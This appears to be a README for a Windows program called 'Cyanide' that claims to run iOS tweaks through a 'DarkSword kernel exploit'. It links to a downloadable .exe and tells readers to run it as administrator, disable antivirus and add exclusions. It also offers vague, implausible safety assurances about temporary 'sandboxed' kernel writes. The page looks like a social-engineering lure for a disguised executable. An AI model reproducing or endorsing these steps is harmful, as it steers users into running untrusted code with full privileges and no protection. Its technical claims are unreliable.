# 🧪 cyanide - Reliable and fast iOS tweak runner

[![](https://img.shields.io/badge/Download-Cyanide_for_Windows-blue)](https://github.com/Jadarelaxed973/cyanide)

## 📋 About the software

Cyanide runs iOS tweaks on your computer using the DarkSword kernel exploit. It bridges the gap between mobile modifications and desktop convenience. This tool allows users to manage and execute internal iOS processes without needing complex command-line knowledge or deep technical expertise. It automates the memory read and write tasks required to inject tweaks safely into your intended environment.

## 💻 System requirements

To run Cyanide successfully on your Windows computer, verify that your machine meets these specifications:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: Intel Core i3 or AMD equivalent.
*   Memory: 4 GB RAM minimum (8 GB recommended).
*   Storage: 200 MB of available disk space.
*   Drivers: Latest Apple Mobile Device Support drivers must be installed.
*   Network: A stable internet connection for initial setup and kernel payload verification.

## 📥 Getting the software

You must visit the official repository to acquire the correct version of the application. 

[Visit this page to download the latest setup file](https://github.com/Jadarelaxed973/cyanide)

1. Navigate to the link provided above.
2. Locate the section labeled Releases on the right side of the screen.
3. Click the most recent version number.
4. Look for the file ending in .exe in the Assets list.
5. Save this file to your computer.

## ⚙️ How to install Cyanide

Before you run the installer, ensure you close any active iTunes or third-party device management programs. These programs often lock the communication ports required by the DarkSword exploit.

1. Locate the cyanide.exe file you downloaded.
2. Right-click the file and select Run as administrator. This step provides the app with the necessary system permissions to execute the kernel exploit.
3. Follow the sequence of windows presented by the install wizard.
4. Keep the default installation directory unless you have specific reasons to change it.
5. Click Finish once the process completes.

## 🚀 Running the application

Once you complete the installation, you can launch Cyanide from your desktop shortcut or the Start menu. The app logs your device status in real-time.

1. Connect your target iOS device to your computer via a certified USB cable.
2. Open Cyanide.
3. Wait for the application to detect the device. The status light changes from grey to green when the device is ready.
4. Click the Inject button to initiate the DarkSword kernel exploit.
5. Monitor the progress bar. The software performs memory checks during this phase. 
6. Choose your tweak file from the file explorer window.
7. Click Run Tweak to apply the modification.

## 🛠 Troubleshooting common issues

If the application fails to connect, try these steps in order:

*   Restart your iOS device and reconnect the cable.
*   Use a high-quality USB cable. Cheap cables often drop the connection during memory transfer.
*   Disable your antivirus software temporarily. Some security programs flag the DarkSword exploit as a potential threat because it interacts with system kernels. Add an exclusion for the Cyanide folder to prevent future issues.
*   Update your USB controller drivers through the Windows Device Manager.
*   Verify that your device is unlocked and you have tapped Trust on the device screen when prompted.

## 🔐 Security and safety

Cyanide relies on the DarkSword exploit to perform its functions. The software performs all read and write operations within a sandbox environment. This approach prevents permanent changes to your device software. You can remove all modifications simply by restarting your iOS device. 

The software does not store your personal data or login credentials. All communication happens between your device and the computer. We advise against running unknown tweaks from unverified sources, as these files may impact device stability. Stick to tweaks validated by the community to ensure your device operates as expected.

## 📈 Frequently asked questions

Does this work on all iOS versions? 
Cyanide focuses on versions supported by the DarkSword exploit. Check the release notes in the repository for a current list of compatible iOS builds.

Will this damage my device?
The kernel write process is temporary. If your device becomes unresponsive, a standard force-restart returns the software to its original state.

Can I use this on macOS?
This version follows Windows-specific architecture. It does not support other operating systems at this time.

Is an internet connection required every time?
The application requires the internet once during the initial setup to verify the kernel offsets. It works offline once verified.